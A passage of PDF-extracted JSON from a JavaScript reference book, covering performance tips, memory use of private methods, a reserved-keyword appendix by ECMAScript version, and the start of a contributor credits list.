        "text": "All modern JavaScript JIT compilers trying to optimize code based on expected object structures. Some tip from mdn . Fortunately, the objects and properties are often \"predictable\", and in such cases their underlying structure can also be predictable. JITs can rely on this to make predictable accesses faster. The best way to make object predictable is to de\ufb01ne a whole structure in a constructor. So if you're going to add some extra properties after object creation, de\ufb01ne them in a constructor with  null . This will help the optimizer to predict object behavior for its whole life cycle. However all compilers have di\ufb00erent optimizers, and the performance increase can be di\ufb00erent, but overall it's good practice to de\ufb01ne all properties in a constructor, even when their value is not yet known. Time for some testing. In my test, I'm creating a big array of some class instances with a for loop. Within the loop, I'm assigning the same string to all object's \"x\" property before array initialization. If constructor initializes \"x\" property with null, array always processes better even if it's doing extra statement. This is code:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  f1 ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  P  =   function   ()   {          this . value   =   1      };      var  big_array  =   new  Array ( 10000000 ) . fill ( 1 ) . map (( x ,  index )=>   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 454",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "        p  =   new  P ();          if   ( index  >   5000000 )   {             p. x   =   \"some_string\" ;          }          return  p ;      });     big_array. reduce (( sum ,  p )=>  sum  +  p. value ,   0 ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  f2 ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  P  =   function   ()   {          this . value   =   1 ;          this . x   =   null ;      };      var  big_array  =   new  Array ( 10000000 ) . fill ( 1 ) . map (( x ,  index )=>   {         p  =   new  P ();          if   ( index  >   5000000 )   {             p. x   =   \"some_string\" ;          }          return  p ;      });     big_array. reduce (( sum ,  p )=>  sum  +  p. value ,   0 ); } ( function  perform (){      var  start  =  performance. now ();     f1 ();      var  duration  =  performance. now ()   -  start ;     console. log ( 'duration of f1  '   +  duration );     start  =  performance. now ();     f2 ();     duration  =  performance. now ()   -  start ;     console. log ( 'duration of f2 '   +  duration ); })()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This is the result for Chrome and Firefox.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "       FireFox     Chrome -------------------------- f1      6,400      11,400 f2      1,700       9,600",
        "font_name": "DejaVuSansMono",
        "font_size": 9,
        "img": []
    },
    {
        "text": "As we can see, the performance improvements are very di\ufb00erent between the two.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 104.6: Reuse objects rather than recreate",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Example A",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  i , a , b , len ; a  =   { x : 0 , y : 0 }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  test (){   // return object created each call",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return   { x : 0 , y : 0 }; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 455",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  test1 ( a ){   // return object supplied",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    a. x = 0 ;     a. y = 0 ;      return  a ; }    for ( i  =   0 ;  i  <   100 ;  i  ++){   // Loop A    b  =  test (); } for ( i  =   0 ;  i  <   100 ;  i  ++){   // Loop B    b  =  test1 ( a ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Loop B is 4 (400%) times faster than Loop A It is very ine\ufb03cient to create a new object in performance code. Loop A calls function  test ()  which returns a new object every call. The created object is discarded every iteration, Loop B calls  test1 ()  that requires the object returns to be supplied. It thus uses the same object and avoids allocation of a new object, and excessive GC hits. (GC were not included in the performance test)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Example B",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  i , a , b , len ; a  =   { x : 0 , y : 0 } function  test2 ( a ){      return   { x  :  a. x   *   10 , y  :  a. x   *   10 }; }    function  test3 ( a ){     a. x =  a. x   *   10 ;     a. y =  a. y   *   10 ;      return  a ; }    for ( i  =   0 ;  i  <   100 ;  i ++){    // Loop A     b  =  test2 ({ x  :   10 ,  y  :   10 }); } for ( i  =   0 ;  i  <   100 ;  i ++){   // Loop B     a. x   =   10 ;     a. y   =   10 ;     b  =  test3 ( a );                  }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Loop B is 5 (500%) times faster than loop A",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 104.7: Prefer local variables to globals, attributes, and indexed values",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "JavaScript engines \ufb01rst look for variables within the local scope before extending their search to larger scopes. If the variable is an indexed value in an array, or an attribute in an associative array, it will \ufb01rst look for the parent array before it \ufb01nds the contents. This has implications when working with performance-critical code. Take for instance a common  for  loop:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  global_variable  =   0 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  foo (){",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    global_variable  =   0 ;      for   ( var  i = 0 ;  i < items. length ;  i ++)   {         global_variable  +=  items [ i ];      }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 456 }",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "For every iteration in  for  loop, the engine will lookup  items , lookup the  length  attribute within items, lookup  items again, lookup the value at index  i  of  items , and then \ufb01nally lookup  global_variable , \ufb01rst trying the local scope before checking the global scope. A performant rewrite of the above function is:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo (){",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  local_variable  =   0 ;      for   ( var  i = 0 ,  li = items. length ;  i < li ;  i ++)   {         local_variable  +=  items [ i ];      }      return  local_variable ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "For every iteration in the rewritten  for  loop, the engine will lookup  li , lookup  items , lookup the value at index  i , and lookup  local_variable , this time only needing to check the local scope.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 104.8: Be consistent in use of Numbers",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "If the engine is able to correctly predict you're using a speci\ufb01c small type for your values, it will be able to optimize the executed code. In this example, we'll use this trivial function summing the elements of an array and outputting the time it took:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// summing properties",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  sum  =   ( function ( arr ){          var  start  =  process. hrtime ();          var  sum  =   0 ;          for   ( var  i = 0 ;  i < arr. length ;  i ++)   {                 sum  +=  arr [ i ];          }          var  diffSum  =  process. hrtime ( start );         console. log ( `Summing took $ { diffSum [ 0 ]   *  1e9  +  diffSum [ 1 ]}  nanoseconds` );          return  sum ; })( arr );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Let's make an array and sum the elements:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var      N  =   12345 ,         arr  =   []; for   ( var  i = 0 ;  i < N ;  i ++)  arr [ i ]   =  Math. random ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Result:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Summing took 384416 nanoseconds",
        "font_name": "DejaVuSansMono",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Now, let's do the same but with only integers:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var      N  =   12345 ,         arr  =   []; for   ( var  i = 0 ;  i < N ;  i ++)  arr [ i ]   =  Math. round ( 1000 * Math. random ());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Result:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 457",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Summing took 180520 nanoseconds",
        "font_name": "DejaVuSansMono",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Summing integers took half the time here.",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Engines don't use the same types you have in JavaScript. As you probably know, all numbers in JavaScript are IEEE754 double precision \ufb02oating point numbers, there's no speci\ufb01c available representation for integers. But engines, when they can predict you only use integers, can use a more compact and faster to use representation, for example, short integers. This kind of optimization is especially important for computation or data intensive applications.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 458",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 105: Memory e\ue024ciency",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 105.1: Drawback of creating true private method",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "One drawback of creating private method in JavaScript is memory-ine\ufb03cient because a copy of the private method will be created every time a new instance is created. See this simple example.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  contact ( first ,  last )   {      this . firstName   =  first ;      this . lastName   =  last ;      this . mobile ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // private method",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  formatPhoneNumber  =   function ( number )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // format phone number based on input",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // public method",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     this . setMobileNumber   =   function ( number )   {          this . mobile   =  formatPhoneNumber ( number );      }; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When you create few instances, they all have a copy of  formatPhoneNumber  method",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  rob  =   new  contact ( 'Rob' ,   'Sanderson' ); var  don  =   new  contact ( 'Donald' ,   'Trump' ); var  andy  =   new  contact ( 'Andy' ,   'Whitehall' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Thus, would be great to avoid using private method only if it's necessary.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 459",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Appendix A: Reserved Keywords",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Certain words - so-called  keywords  - are treated specially in JavaScript. There's a plethora of di\ufb00erent kinds of keywords, and they have changed in di\ufb00erent versions of the language.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section A.1: Reserved Keywords",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "JavaScript has a prede\ufb01ned collection of  reserved keywords  which you cannot use as variables, labels, or function names. ECMAScript 1",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version = 1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "A  \u2014  E E  \u2014  R S  \u2014  Z",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "break",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "export super case extends",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "switch catch false this",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "class",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "finally throw const for true continue function try",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "debugger  if",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof default",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "import var",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "delete in void do new",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "while else null with enum",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "return",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "ECMAScript 2",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Added  24  additional reserved keywords. (New additions in bold).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version = 3   Version = E4X",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "A  \u2014  F F  \u2014  P P  \u2014  Z",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "abstract final public boolean finally return break float short byte for static case function",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "super",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "catch goto switch char if synchronized",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "class",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "implements  this const",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "import",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "throw continue  in throws debugger  instanceof  transient default int true delete interface try do long typeof double native var else new void enum null volatile",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "export",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "package",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "while extends",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "private with",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 460",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "false",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "protected",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "ECMAScript 5 / 5.1",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "There was no change since  ECMAScript 3 .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "ECMAScript 5  removed  int ,  byte ,  char ,  goto ,  long ,  final ,  float ,  short ,  double ,  native ,  throws ,  boolean ,  abstract , volatile ,  transient , and  synchronized ; it added  let  and  yield .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A  \u2014  F F  \u2014  P P  \u2014  Z",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "break finally",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "public case for",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "return catch function static",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "class if super",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "const",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "implements  switch",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "continue  import this",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "debugger  in",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "throw default instanceof  true delete",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "interface try do let",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof else new var enum null void",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "export package while extends private with",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "false",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "protected",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "yield",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "implements ,  let ,  private ,  public ,  interface ,  package ,  protected ,  static , and  yield  are  disallowed in",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "strict mode only .",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "eval  and  arguments  are not reserved words but they act like it in  strict mode .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "ECMAScript 6 / ECMAScript 2015",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "A  \u2014  E E  \u2014  R S  \u2014  Z",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "break",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "export super case extends",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "switch catch finally this",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "class for",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "throw const function try continue  if typeof",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "debugger import var",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "default in void delete instanceof  while do new with else return",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "yield",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Future reserved keywords The following are reserved as future keywords by the ECMAScript speci\ufb01cation. They have no special functionality at",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 461",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "present, but they might at some future time, so they cannot be used as identi\ufb01ers. enum The following are only reserved when they are found in strict mode code:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "implements  package public interface private",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "`static' let",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "protected",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Future reserved keywords in older standards The following are reserved as future keywords by older ECMAScript speci\ufb01cations (ECMAScript 1 till 3).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "abstract float short boolean goto synchronized byte",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "instanceof  throws char int",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "transient double long volatile final native",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Additionally, the literals null, true, and false cannot be used as identi\ufb01ers in ECMAScript. From the  Mozilla Developer Network .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section A.2: Identi\ufb01ers & Identi\ufb01er Names",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "With regards to reserved words there is a small distinctions between the  \"Identi\ufb01ers\"  used for the likes of variable or function names and the  \"Identi\ufb01er Names\"  allowed as properties of composite data types. For example the following will result in an illegal syntax error:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var   break   =   true ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Uncaught SyntaxError: Unexpected token break However the name is deemed valid as a property of an object (as of ECMAScript 5+):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     break :   true };",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( obj. break );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To quote from  this answer : From the  ECMAScript \u00ae  5.1 Language Speci\ufb01cation : Section 7.6 Identi\ufb01er Names are tokens that are interpreted according to the grammar given in the  \u201c Identi\ufb01ers \u201d section of chapter 5 of the Unicode standard, with some small modi\ufb01cations. An  Identifier  is an IdentifierName  that is not a  ReservedWord  (see  7.6.1 ).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 462",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Syntax",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Identifier  ::   IdentifierName but not ReservedWord",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "By speci\ufb01cation, a  ReservedWord  is: Section 7.6.1 A reserved word is an  IdentifierName  that cannot be used as an  Identifier .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "ReservedWord  ::   Keyword   FutureReservedWord   NullLiteral   BooleanLiteral",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This includes keywords, future keywords,  null , and boolean literals. The full list of keywords are in  Sections 7.6.1 and literals are in  Section 7.8 . The above (Section 7.6) implies that  IdentifierName s can be  ReservedWord s, and from the speci\ufb01cation for  object initializers : Section 11.1.5",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Syntax",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "ObjectLiteral  :    {   }    {  PropertyNameAndValueList  }    {  PropertyNameAndValueList  ,   }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Where  PropertyName  is, by speci\ufb01cation:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "PropertyName  :   IdentifierName   StringLiteral   NumericLiteral",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "As you can see, a  PropertyName  may be an  IdentifierName , thus allowing  ReservedWord s to be  PropertyName s. That conclusively tells us that,  by speci\ufb01cation , it is allowed to have  ReservedWord s such as  class  and  var  as PropertyName s unquoted just like string literals or numeric literals. To read more, see  Section 7.6  - Identi\ufb01er Names and Identi\ufb01ers. Note:  the syntax highlighter in this example has spotted the reserved word and still highlighted it. While the example is valid JavaScript developers can get caught out by some compiler / transpiler, linter and mini\ufb01er tools that argue otherwise.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 463",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Credits",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Thank you greatly to all the people from Stack Over\ufb02ow Documentation who helped provide this content, more changes can be sent to  web@petercv.com  for new content to be published or updated 16807 Chapter 104 2426021684 Chapters 1, 7, 12, 42 and 59 4444 Chapter 23 4m1r Chapter 100 A.J Chapter 61 A.M.K Chapters 5, 12, 40, 63, 72 and 73 Aadit M Shah Chapter 29 Abdelaziz Mokhnache Chapter 1 Abhishek Chapter 65 Abhishek Singh Chapter 48 Adam Heath Chapter 59 adius Chapter 31 adriennetacke Chapter 68 Aeolingamenfel Chapter 62 afzalex Chapter 42 Ahmed Ayoub Chapter 12 aikeru Chapter 14 Ajedi32 Chapter 16 Akshat Mahajan Chapter 53 Ala Eddine JEBALI Chapters 1, 24 and 56 Alberto Nicoletti Chapters 13, 14 and 43 Alejandro Nanez Chapter 12 Alex Chapter 63 Alex Filatov Chapters 14, 35 and 67 Alex Logan Chapter 5 Alexander O'Mara Chapter 1 Alexandre N. Chapters 1 and 42 aluxian Chapter 81 am\ufb02are Chapter 20 Aminadav Chapters 1, 35 and 104 Andrew Burgess Chapter 55 Andrew Myers Chapter 4 Andrew Sklyarevsky Chapters 59 and 98 Andrew Sun Chapter 59 Andrey Chapter 14 Angel Politis Chapters 36 and 47 Angela Amarapala Chapter 26 Angelos Chalaris Chapters 13, 37 and 46 Ani Menon Chapters 1 and 36 Anirudh Modi Chapters 12, 19, 50, 60 and 62 Anirudha Chapter 103 Anko Chapter 1 Ankur Anand Chapter 1 Anurag Singh Bisht Chapter 87 Ara Yeressian Chapter 42 Araknid Chapters 11 and 30 arbybruce Chapter 33",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 464",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Armfoot Chapter 62 AstroCB Chapter 1 Aswin Chapter 21 Atakan Goktepe Chapter 5 ATechieThought Chapter 1 Ates Goral Chapters 3, 35 and 42 Awal Garg Chapters 41 and 42 azz Chapter 10 Badacadabra Chapter 25 baga Chapter 5 balpha Chapter 12 Bamieh Chapter 12 BarakD Chapter 22 Barmar Chapter 14 Basilin Joe Chapter 28 Beau Chapter 5 Bekim Bacaj Chapter 1 Ben Chapter 12 Ben McCormick Chapter 60 Benjadahl Chapter 19 Bennett Chapter 70 bfavaretto Chapter 1 Bit Byte Chapter 89 Black Chapter 1 Blindman67 Chapters 10, 12, 14, 28, 41, 56, 84 and 104 bloodyKnuckles Chapter 63 Blubberguy22 Chapter 11 Blue Sheep Chapters 14 and 104 BluePill Chapter 7 Blundering Philosopher Chapters 1 and 42 bobylito Chapter 42 Boopathi Rajaa Chapters 22, 41, 50 and 63 Borja Tur Chapters 13 and 19 Bo \u017e o Stojkovi \u0107 Chapters 1, 12 and 42 Brandon Buck Chapter 1 Brendan Doherty Chapter 50 brentonstrine Chapter 19 Brett DeWoody Chapter 12 Brett Zamir Chapters 1 and 4 Brian Liu Chapter 105 bwegs Chapters 1, 56 and 62 C L K Kissane Chapter 5 Callan Heard Chapter 50 CamJohnson26 Chapter 50 catalogue_number Chapter 1 cchamberlain Chapter 5 CD.. Chapters 12 and 13 cdm Chapter 58 cdrini Chapters 19 and 55 Cerbrus Chapters 1, 5, 14, 17, 40, 42, 99 and 103 cFreed Chapter 10 Charlie H Chapters 10, 14, 35 and 54 Chong Lip Phang Chapter 50",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 465 choz",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
